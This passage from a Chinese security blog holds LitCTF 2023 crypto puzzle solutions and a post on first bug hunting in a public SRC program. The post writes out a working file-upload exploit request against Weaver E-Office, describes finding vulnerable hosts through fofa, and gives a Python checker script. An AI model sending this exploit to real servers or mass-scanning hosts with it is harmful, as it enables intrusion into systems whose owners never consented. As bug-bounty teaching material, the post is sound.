class="number">66302204855869216148926460265779698576660998574555407124043768605865908069722142097621926304390549253688814246272903647124801382742681337653915017783954290069842646020090511605930590064443141710086879668946</span>&lt;&lt;<span class="number">340</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c= <span class="number">6566517934961780069851397787369134601399136324586682773286046135297104713708615112015588908759927424841719937322574766875308296258325687730658550956691921018605724308665345526807393669538103819281108643141723589363068859617542807984954436567078438099854340705208503317269397632214274507740533638883597409138972287275965697689862321166613821995226000320597560745749780942467497435742492468670016480112957715214640939272457886646483560443432985954141177463448896521810457886108311082101521263110578485768091003174683555938678346359150123350656418123918738868598042533211541966786594006129134087145798672161268647536724</span></span><br><span class="line"></span><br><span class="line">pbits = p_fake.nbits()</span><br><span class="line">kbits = <span class="number">340</span> <span class="comment">#p失去的低位</span></span><br><span class="line">pbar = p_fake &amp; (<span class="number">2</span>^pbits-<span class="number">2</span>^kbits)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;upper %d bits (of %d bits) is given&quot;</span> % (pbits-kbits, pbits))</span><br><span class="line"> </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.3</span></span><br><span class="line">p=x0 + pbar</span><br><span class="line">q=<span class="built_in">int</span>(n)//<span class="built_in">int</span>(p)</span><br><span class="line"></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,<span class="built_in">int</span>(phi))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># LitCTF&#123;Y0U_hAV3_g0T_Th3_r1ghT_AnsW3r&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="我测你vva"><a href="#我测你vva" class="headerlink" title="我测你vva"></a>我测你vva</h1><p>直接写脚本逆回去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher=<span class="string">&#x27;HYEQJvPZ~X@+Bp&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    x=cipher.index(i)</span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-x)</span><br><span class="line">    <span class="keyword">elif</span> x%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+x)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># HZCTF&#123;Java666&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="Virginia"><a href="#Virginia" class="headerlink" title="Virginia"></a>Virginia</h1><p>维吉尼亚解码得</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">There are moments in life when you miss someone so much that you just want to pick them from your dreams and hug them for real! Dream what you want to dream;go where you want to go;be what you want to be,because you have only one life and one chance to do all the things you want to do.May you have enough happiness to make you sweet,enough trials to make you strong,enough sorrow to keep you human,enough hope to make you happy? Always put yourself in others’shoes.If you feel that it hurts you,it probably hurts the other person, too.The happiest of people don’t necessarily have the best of everything;they just make the most of everything that comes along their way.Happiness lies for those who cry,those who hurt, those who have searched,and those who have tried,for only they can appreciate the importance of people,who have touched their lives.Love begins with a smile,grows with a kiss and ends with a tear.The brightest future will always be based on a forgotten past, you can’t go on well in lifeuntil you let go of your past failures and heartaches.When you were born,you were crying and everyone around you was smiling.Live your life so that when you die,you&#x27;re the one who is smiling and everyone around you is crying.</span><br><span class="line">Jwybmp mfho nicd gfmduhy ei ubzmf jpiqfp qii xybh dinyebjhr np szo,ui ebpmp qii suwy eivwsye szos ftzf cy ioy huz ic uoiebfl,ei ubzmf qsi nuvy zif mncwy xbph zif lfuwfz hpye ce,np nsity ebbn xuly jiv mpy ubp vscrbuyc mjxp ig nscoad qiyy spo llf lpumfj xpqy,np nsity hbp szo xuyn ui wyu nsyn eyix nsuu szo bjalfwtuuy ebfcc zscphemscq.Uyx jz jiv xzh’u, xzh’u qzlss,yiubthh vlx xcwf iuajfh ei zif,spo hcmf uotn xctm zou iy niy zjqicnvhtnz nz vscrbuyy mpgpioy’d xbs hcub ebjm xytmlaf.Gj jbmdqplo ct hzn b lpavfll Dupmbl autmhisx,lhe nsy fhn zmur=[86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164] -Wbydus</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把后半部分在维吉尼亚解一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please send this message to those people who mean something to you,to those who have touched your life in one way or another,to those who make you smile when you really need it,to those that make you see the brighter side of things when you are really down,to those who you want to let them know that you appreciate their friendship.And if you don’t, don’t worry,nothing bad will happen to you,you will just miss out on the opportunity to brighten someone’s day with this message.My password is not a regular Caesar password,and the enc flag=[86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164] -Caesar</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">86</span>, <span class="number">116</span>, <span class="number">128</span>, <span class="number">80</span>, <span class="number">98</span>, <span class="number">85</span>, <span class="number">139</span>, <span class="number">122</span>, <span class="number">134</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">136</span>, <span class="number">117</span>, <span class="number">123</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">142</span>, <span class="number">130</span>, <span class="number">140</span>, <span class="number">147</span>, <span class="number">127</span>, <span class="number">132</span>, <span class="number">131</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">134</span>, <span class="number">152</span>, <span class="number">164</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">m=<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i-m)</span><br><span class="line">    m+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># LitCTF&#123;it_is_different_caesar&#125;</span></span><br></pre></td></tr></table></figure>





<h1 id="babyLCG"><a href="#babyLCG" class="headerlink" title="babyLCG"></a>babyLCG</h1><p>简单LCG直接套脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line">s = [<span class="number">699175025435513913222265085178805479192132631113784770123757454808149151697608216361550466652878</span>, <span class="number">193316257467202036043918706856603526262215679149886976392930192639917920593706895122296071643390</span>, <span class="number">1624937780477561769577140419364339298985292198464188802403816662221142156714021229977403603922943</span>, <span class="number">659236391930254891621938248429619132720452597526316230221895367798170380093631947248925278766506</span>, <span class="number">111407194162820942281872438978366964960570302720229611594374532025973998885554449685055172110829</span>, <span class="number">1415787594624585063605356859393351333923892058922987749824214311091742328340293435914830175796909</span>, <span class="number">655057648553921580727111809001898496375489870757705297406250204329094679858718932270475755075698</span>, <span class="number">1683427135823894785654993254138434580152093609545092045940376086714124324274044014654085676620851</span>, <span class="number">492953986125248558013838257810313149490245209968714980288031443714890115686764222999717055064509</span>, <span class="number">70048773361068060773257074705619791938224397526269544533030294499007242937089146507674570192265</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    t.append(s[i]-s[i-<span class="number">1</span>])</span><br><span class="line">all_n = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    all_n.append(gcd((t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]), (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(plaintext))</span><br><span class="line"><span class="comment">#LitCTF&#123;31fcd7832029a87f6c9f760fcf297b2f&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="隐晦的聊天记录"><a href="#隐晦的聊天记录" class="headerlink" title="隐晦的聊天记录"></a>隐晦的聊天记录</h1><p>首先求出密钥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c1=<span class="string">&quot;attack at dawn&quot;</span></span><br><span class="line">c2=<span class="string">&#x27;6c73d5240a948c86981bc294814d&#x27;</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    a.append(<span class="built_in">ord</span>(c1[i])^<span class="built_in">int</span>(c2[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[13, 7, 161, 69, 105, 255, 172, 231, 236, 59, 166, 245, 246, 35]</span><br></pre></td></tr></table></figure>

<p>然后求第二个明文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">13</span>, <span class="number">7</span>, <span class="number">161</span>, <span class="number">69</span>, <span class="number">105</span>, <span class="number">255</span>, <span class="number">172</span>, <span class="number">231</span>, <span class="number">236</span>, <span class="number">59</span>, <span class="number">166</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">35</span>]</span><br><span class="line">c=<span class="string">&#x27;Monday or Thur&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(c[i])^a[i])[<span class="number">2</span>:],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#40 68 cf 21 8 86 8c 88 9e 1b f2 9d 83 51 </span></span><br></pre></td></tr></table></figure>

<p>可以观察到其中有一个是  8  我们补成08</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;4068cf2108868c889e1bf29d8351&#125;</span><br></pre></td></tr></table></figure>





<h1 id="Euler"><a href="#Euler" class="headerlink" title="Euler"></a>Euler</h1><p>欧拉定理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549</span></span><br><span class="line">c = <span class="number">406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f=c-x^<span class="number">2</span></span><br><span class="line">f=f.monic()</span><br><span class="line">root=f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>,beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(root[<span class="number">0</span>])))</span><br><span class="line"><span class="comment"># LitCTF&#123;a1a8887793acfc199182a649e905daab&#125;</span></span><br></pre></td></tr></table></figure>





<h1 id="baby-xor"><a href="#baby-xor" class="headerlink" title="baby_xor"></a>baby_xor</h1><p>本来求出m但是解不出来，应该就是泄露的位数不够</p>
<p>找了一个爆破八位的脚本，虽然有点慢但还是出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">139167681803392690594490403105432649693546256181767408269202101512534988406137879788255103631885736461742577594980136624933914700779445704490217419248411578290305101891222576080645870988658334799437317221565839991979543660824098367011942169305111105129234902517835649895908656770416774539906212596072334423407</span></span><br><span class="line">c1 = <span class="number">11201139662236758800406931253538295757259990870588609533820056210585752522925690049252488581929717556881067021381940083808024384402885422258545946243513996</span></span><br><span class="line">c2 = <span class="number">112016152270171196606652761990170033221036025260883289104273504703557624964071464062375228351458191745141525003775876044271210498526920529385038130932141551598616579917681815276713386113932345056134302042399379895915706991873687943357627747262597883603999621939794450743982662393955266685255577026078256473601</span></span><br><span class="line">high_p=(c1&gt;&gt;<span class="number">256</span>)</span><br><span class="line"><span class="comment">#这个脚本是位数不够时爆破八位然后恢复p的脚本，</span></span><br><span class="line">kbits=<span class="number">256</span>-<span class="number">8</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">high_p=high_p&lt;&lt;<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):<span class="comment"># 要爆破的8位二进制数，为2**8==256，表示0~255</span></span><br><span class="line">    p = high_p &lt;&lt; kbits</span><br><span class="line">    f = x + p</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^kbits,beta=<span class="number">0.4</span>,epsilon=<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p= p + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        m=c1.__xor__(<span class="built_in">int</span>(p))</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    high_p=high_p+<span class="number">1</span></span><br><span class="line"><span class="comment"># LitCTF&#123;oh!!!!coppersmith_is_fun&#125;</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LitCTF2023/" rel="tag">LitCTF2023</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-漏洞盒子公益SRC第一次挖掘"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/"
    >漏洞盒子公益SRC第一次挖掘</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/" class="article-date">
  <time datetime="2023-05-05T16:37:25.000Z" itemprop="datePublished">2023-05-06</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="了解漏洞盒子公益SRC"><a href="#了解漏洞盒子公益SRC" class="headerlink" title="了解漏洞盒子公益SRC"></a>了解漏洞盒子公益SRC</h1><p>当时也是打比赛打累了，刚好那周的周末没有比赛，然后就想了解一下漏洞盒子的漏洞提交机制以及都可以提交什么类型的漏洞。里面有很多的企业SRC但是以我弱弱的能力肯定也挖不到，就想先用Nday打几个公益SRC。</p>
<h1 id="漏洞文库"><a href="#漏洞文库" class="headerlink" title="漏洞文库"></a>漏洞文库</h1><p>我经常用的漏洞文库是PeiQi文库</p>
<p><a target="_blank" rel="noopener" href="http://api.orchidstudio.cn/">http://api.orchidstudio.cn/</a></p>
<p>有很多类型的漏洞</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506010835564.png" alt="image-20230506010835564"></p>
<h1 id="第一次利用Nday（漏洞复现）"><a href="#第一次利用Nday（漏洞复现）" class="headerlink" title="第一次利用Nday（漏洞复现）"></a>第一次利用Nday（漏洞复现）</h1><p>我第一次打的是泛微OA E-Office UploadFile.php 任意文件上传漏洞</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011028027.png" alt="image-20230506011028027"></p>
<p>通过POST方式上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /general/index/UploadFile.php?m=uploadPicture&amp;uploadType=eoffice_logo&amp;userId= HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348</span><br><span class="line">Content-Length: 193</span><br><span class="line">Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4</span><br><span class="line"></span><br><span class="line">--e64bdf16c554bbc109cecef6451c26a4</span><br><span class="line">Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">--e64bdf16c554bbc109cecef6451c26a4--</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>上传成功的话会出现以下页面</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011412143.png" alt="image-20230506011412143"></p>
<p>然后我们访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/images/logo/logo-eoffice.php</span><br></pre></td></tr></table></figure>

<p>就会成功访问phpinfo</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011551616.png" alt="image-20230506011551616"></p>
<p>说明漏洞存在并可以利用</p>
<h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><p>我常用的是fofa和hunter</p>
<p>在PeiQi文库这个地方有网络测绘，直接复制搜索</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011820951.png" alt="image-20230506011820951"></p>
<p>以fofa举例</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506012132428.png" alt="image-20230506012132428"></p>
<p>收集完资产后可以对资产进行检测是否存在漏洞</p>
<h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>如果我们通过一个一个复现的方法显然太慢，所以可以下脚本批量检测，这里我贴一个脚本检测的，但不是批量的，批量检测大家可以试着自己写写</p>
<p>首先就是要通过python的requests模块可以先把BP的post包copy为</p>
<p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506012618843.png" alt="image-20230506012618843"></p>
<p>然后通过写脚本观察返回包是否含有logo-eoffice.php，来判断是否存在漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#_*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">efff</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        burp0_url =<span class="string">&quot;http://&quot;</span>+url+<span class="string">&quot;/general/index/UploadFile.php?m=uploadPicture&amp;uploadType=eoffice_logo&amp;userId=&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;LOGIN_LANG&quot;</span>: <span class="string">&quot;cn&quot;</span>, <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;0acfd0a2a7858aa1b4110eca1404d348&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4&quot;</span>&#125;</span><br><span class="line">        burp0_data = <span class="string">&quot;--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\&quot;Filedata\&quot;; filename=\&quot;test.php\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n&quot;</span></span><br><span class="line">        cd=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;logo-eoffice.php&#x27;</span> <span class="keyword">in</span> cd.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在漏洞&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">url=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">efff(url)</span><br></pre></td></tr></table></figure>

<p>如果可以上传logo-eoffice.php，在通过是否能访问phpinfo判断漏洞是否可以利用</p>
<h1 id="漏洞报告"><a href="#漏洞报告" class="headerlink" title="漏洞报告"></a>漏洞报告</h1><p>在写漏洞盒子的漏洞报告时，我的建议是尽量写详细点，像漏洞描述、漏洞修复建议写详细点，到时候评报告质量，相同的漏洞报告质量越高到时候得到的积分可能就越多</p>
<h1 id="挖洞建议"><a href="#挖洞建议" class="headerlink" title="挖洞建议"></a>挖洞建议</h1><p>有的时候挖到漏洞不要尝试深度利用，能够证明漏洞存在就行。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%AC%E7%9B%8Asrc/" rel="tag">公益src</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-edusrc的第一次挖掘"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
